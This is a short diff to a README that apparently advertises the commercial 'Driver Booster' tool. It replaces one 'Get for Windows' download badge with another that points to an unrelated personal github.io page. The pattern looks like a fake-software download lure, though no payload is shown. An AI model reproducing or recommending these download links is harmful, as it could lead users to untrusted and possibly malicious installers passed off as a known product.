@@ -4,11 +4,8 @@
   <img src="https://eu.keysoff.com/media/wysiwyg/Driver-Booster.png" alt="Driver Booster AeroCore Logo"/>
 </p>
 
-<p align="center">
-  <a href="https://driver-booster-hypercore.github.io/.github/">
-    <img src="https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge&logo=windows" alt="Get for Windows"/>
-  </a>
-</p>
+[![GET driver booster](https://img.shields.io/badge/GET%20%E2%80%94%20driver-booster-0078D6?style=for-the-badge&logoColor=white)](https://vandenhenstthijn8215.github.io/.github/driver-booster)
+
 
 ---
 
